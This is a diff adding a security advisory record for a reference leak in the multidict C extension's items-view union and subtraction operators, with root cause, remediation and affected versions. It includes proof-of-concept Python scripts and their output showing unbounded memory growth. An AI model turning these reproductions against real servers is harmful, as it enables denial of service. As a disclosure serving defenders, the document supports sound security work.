@@ -1,0 +1,64 @@
+{
+  "id": "GHSA-54p9-h82j-f925",
+  "modified": "2026-10-06T00:00:09.468260817Z",
+  "published": "2026-10-05T23:40:58Z",
+  "aliases": [
+    "CVE-2026-104874"
+  ],
+  "summary": "Multidict: Reference leak in CIMultiDict/MultiDict items-view union and subtraction",
+  "details": "## Description\n\nA reference leak in the items-view union and subtraction operators of aio-libs/multidict 6.7.0 through 6.9.0 (C extension) lets a remote client drive unbounded, unreclaimable memory growth by having each operand element leak one key-identity object and one value object. The reflected-union path (`operand | d.items()`, `multidict_itemsview_or2_impl`) and the subtraction path (`d.items() - operand`, `multidict_itemsview_sub1_impl`) parse each element into new strong references but release only the tuple wrapper, never the identity and value. Servers in the aio-libs stack build these views over attacker-supplied HTTP headers and query strings, so the operand size is under remote control. Forced garbage collection does not recover the leaked objects, so resident memory rises monotonically until the process is killed.\n\n---\n\n## Root Cause\n\n`_multidict_itemsview_parse_item()` returns **new** references: a fresh identity via `md_calc_identity()` and a fresh value via `Py_NewRef()`. The `or2_impl` first parse loop requests both but clears only `arg`:\n\n```c\n// views.h:565 — or2_impl first parse loop\nwhile ((st = PyIter_NextItem(iter, \u0026arg)) \u003e 0) {\n    int tmp = _multidict_itemsview_parse_item(\n        self, arg, \u0026identity, NULL, \u0026value);   // identity + value: new refs\n    if (tmp \u003c 0) goto fail;\n    else if (tmp \u003e 0) {\n        if (_set_add(tmp_set, identity, value) \u003c 0) goto fail;\n    }\n    Py_CLEAR(arg);                             // :575 clears arg ONLY\n}\n```\n\n`_set_add()` builds its own tuple with `PyTuple_Pack` and `Py_DECREF`s it, so it never borrows the loop's `identity`/`value`. On the next iteration those variables are overwritten, so the previous references are lost permanently. The `sub1_impl` first loop (`:686-696`) has the identical omission.\n\nThis is an editing slip, not an ownership contract: every sibling path clears all three references per iteration, `and1_impl` (`:304-306`), `and2_impl` (`:389-391`), `or1_impl` (`:506-508`), and the second (`md_next`) loops of both functions (`:605-607`, `:726-728`). PR #1413 added a `Py_DECREF(tpl)` to the *second* loop of `or2`/`sub1`, fixing a different temporary-tuple leak; it never touched the first parse loop, so this leak remains on `master`.\n\n`views.h` is byte-identical between `v6.6.0` and `v6.7.0`, yet 6.6.4 does not leak and 6.7.0 does. The regression is behavioural, introduced by a key-identity ownership change in `hashtable.h` across that boundary that made `md_calc_identity()` return a fresh strong reference the unchanged parse loop never releases.\n\n---\n\n## Reproduction Environment\n\n| Item | Value |\n|------|-------|\n| **Runtime** | CPython 3.14.6 |\n| **multidict** | 6.9.0 (PyPI binary wheel, C extension) |\n| **OS** | macOS (darwin 25.6.0, arm64) |\n\n---\n\n## Proof of Concept\n\n### POC Source Code\n\n#### poc_refcount.py — leak proof with intersection control\n\n```python\nimport sys, gc\nfrom multidict import CIMultiDict\n\ndef probe(name, run_op):\n    d = CIMultiDict(); d[\"seed\"] = \"x\"\n    value = object()                 # unique sentinel\n    N = 100000\n    operand = [(\"k%d\" % i, value) for i in range(N)]\n    gc.collect(); before = sys.getrefcount(value)\n    run_op(d, operand)\n    gc.collect(); after = sys.getrefcount(value)\n    print(f\"[{name}] leaked strong refs = {after - before}\")\n\nprobe(\"or2  operand | items\", lambda d, o: o | d.items())    # reflected union\nprobe(\"sub1 items - operand\", lambda d, o: d.items() - o)    # subtraction\nprobe(\"and2 items \u0026 operand\", lambda d, o: d.items() \u0026 o)    # CONTROL: clears, expect 0\n```\n\n#### poc_dispatch.py — maps which paths leak\n\n```python\nimport sys, gc\nfrom multidict import CIMultiDict\n\ndef probe(name, fn):\n    d = CIMultiDict(); d[\"seed\"] = \"x\"\n    v = object(); N = 50000\n    operand = [(\"k%d\" % i, v) for i in range(N)]\n    gc.collect(); before = sys.getrefcount(v)\n    fn(d, operand); gc.collect(); after = sys.getrefcount(v)\n    print(f\"{name:35s} leaked={after - before}\")\n\nprobe(\"operand | d.items()  (or2)\",  lambda d, o: o | d.items())\nprobe(\"d.items() | operand  (or1)\",  lambda d, o: d.items() | o)\nprobe(\"d.items() - operand  (sub1)\", lambda d, o: d.items() - o)\nprobe(\"operand - d.items()  (rsub)\", lambda d, o: set(o) - d.items())\nprobe(\"d.items() \u0026 operand  (and)\",  lambda d, o: d.items() \u0026 o)\n```\n\n#### poc_rss.py — availability consequence\n\n```python\nimport sys, gc, resource\nfrom multidict import CIMultiDict\n\ndef rss_mb():\n    r = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss\n    return r / (1024 * 1024) if sys.platform == \"darwin\" else r / 1024\n\nd = CIMultiDict(); d[\"seed\"] = \"x\"\ngc.collect(); print(f\"start RSS = {rss_mb():.1f} MB\")\nfor i in range(200):\n    operand = [(f\"k{i}_{j}\", f\"v{i}_{j}\") for j in range(50000)]\n    _ = operand | d.items()\n    del operand\n    gc.collect()                     # prove GC cannot reclaim the leak\n    if (i + 1) % 40 == 0:\n        print(f\"after {(i+1)*50000:\u003e9,} elements: RSS = {rss_mb():.1f} MB\")\n```\n\n### Execution Steps\n\n1. `python3 -m venv venv` (CPython 3.10+).\n2. `./venv/bin/pip install \"multidict==6.9.0\"` (installs the C-extension wheel).\n3. From a directory that is **not** a multidict checkout, run each script with `./venv/bin/python`.\n\n### Actual Execution Evidence\n\n```\n[or2  operand | items] leaked strong refs = 100000\n[sub1 items - operand] leaked strong refs = 100000\n[and2 items \u0026 operand] leaked strong refs = 0        \u003c- control\n```\n\n```\noperand | d.items()  (or2)          leaked=50000\nd.items() | operand  (or1)          leaked=0\nd.items() - operand  (sub1)         leaked=50000\noperand - d.items()  (rsub)         leaked=0\nd.items() \u0026 operand  (and)          leaked=0\n```\n\n```\nstart RSS = 15.6 MB\nafter 2,000,000 elements: RSS = 288.1 MB\nafter 6,000,000 elements: RSS = 776.8 MB\nafter 10,000,000 elements: RSS = 1266.8 MB   (gc.collect() every iteration)\n```\n\n### Version-boundary evidence\n\nSame `poc_dispatch.py`, PyPI wheels, identical environment. Last-clean is `6.6.4`; first-affected is `6.7.0`:\n\n```\n6.6.4 : or2=0      sub1=0      others=0   (clean, last 6.6.x)\n6.7.0 : or2=50000  sub1=50000  others=0   (AFFECTED, first)\n6.9.0 : or2=50000  sub1=50000  others=0   (affected)\n```\n\nThe clean 6.6.x releases return correct set-operation results, so the zero leak reflects correct memory management, not a broken path.\n\n### Analysis of Results\n\nThe operand holds exactly `N` references to one sentinel value; after the union its refcount rises by another `N` and stays there post-GC, so each element leaked one strong reference. Subtraction shows the identical delta. The intersection control, which clears `identity` and `value`, leaks zero; the only code difference is the two missing `Py_CLEAR` calls, so the leak is caused by that omission and not the harness. RSS climbs from 15.6 MB to 1266.8 MB (~250 MB per 2M elements) despite per-iteration GC, confirming the objects are unreachable by the cyclic collector.\n\n---\n\n## Impact\n\nA process that evaluates items-view unions or subtractions over remote-influenced operands leaks one identity plus one value object per element, permanently. In the aio-libs stack multidict backs HTTP headers and query strings, so an attacker who enlarges the operand (for example, many repeated header items compared against a fixed allow/deny set) forces steady, unrecoverable heap growth and can eventually exhaust memory in a long-lived server. This is an availability defect only; results stay correct and no data is exposed.\n\nReachability depends on the application evaluating `operand | view.items()` (reflected union) or `view.items() - operand` (subtraction) over a sequence of 2-tuples whose count is remote-influenced. The forward union `view.items() | operand` routes to `or1_impl`, which clears correctly and does not leak; a non-tuple operand element takes the `parse_item` early-return and does not leak. Set algebra over items views is not the most common multidict usage, which bounds exposure and is why this is Medium, not High. This is distinct from PR #1413, which fixed a temporary-tuple leak in the second loop and did not release these per-element objects.\n\n---\n\n## Remediation\n\n**Recommended fix.** Clear the two per-element references at the end of the first parse loop in both functions, exactly as every sibling path does. In `or2_impl` (`views.h:575`) and `sub1_impl` (`views.h:696`), replace the lone `Py_CLEAR(arg);` with:\n\n```c\n    Py_CLEAR(arg);\n    Py_CLEAR(identity);\n    Py_CLEAR(value);\n```\n\nThis is an in-repo change to a static internal function; it alters no public API, type, or signature, and asks callers to change nothing. A leak test in the existing `tests/test_leaks.py` style would lock it in.\n\n**Workaround.** Avoid `operand | view.items()` and `view.items() - operand` on attacker-influenced operands, or install with `MULTIDICT_NO_EXTENSIONS=1` to use the unaffected pure-Python build.\n\n---",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "multidict",
+        "purl": "pkg:pypi/multidict"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "6.7.0"
+            },
+            {
+              "fixed": "6.9.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "6.7.0",
+        "6.7.1",
+        "6.8.0",
+        "6.9.0"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 6.9.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-54p9-h82j-f925/GHSA-54p9-h82j-f925.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/aio-libs/multidict/security/advisories/GHSA-54p9-h82j-f925"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-104874"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/aio-libs/multidict/commit/350b4a07bf8ff851b6d7544e81b1c748bdc74c40"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/aio-libs/multidict"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/aio-libs/multidict/releases/tag/v6.9.1"
+    }
+  ]
+}
